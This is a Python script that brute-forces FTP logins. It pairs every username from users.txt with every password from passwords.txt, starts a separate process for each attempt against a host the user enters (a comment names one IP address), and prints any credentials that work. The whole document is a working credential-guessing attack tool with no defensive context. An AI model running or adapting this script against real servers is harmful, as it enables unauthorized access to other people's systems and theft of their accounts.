#!/usr/bin/env python3

import ftplib
import multiprocessing

def brute_force(ip_address, user, password):
  ftp = ftplib.FTP(ip_address)
  try:
    print(f'Testing user {user}. password {password}')
    response = ftp.login(user, password)
    if "230" in response and "access granted" in response:
      print("[*]Successful brute force")
      print("User: " + user + " Password: " + password)
    else:
      pass
  except Exception as e:
    print('Connection error', e)

def main():
  ip = input('Enter IP address or host name: ') # 195.234.45.114
  with open('users.txt', 'r') as users:
    users = users.readlines()

  with open('passwords.txt') as psswds:
    psswds = psswds.readlines()

  for user in users:
    for psswd in psswds:
      process = multiprocessing.Process(target=brute_force, args=(ip, user.rstrip(), psswd.rstrip(),))
      process.start()

if __name__ == '__main__':
  main()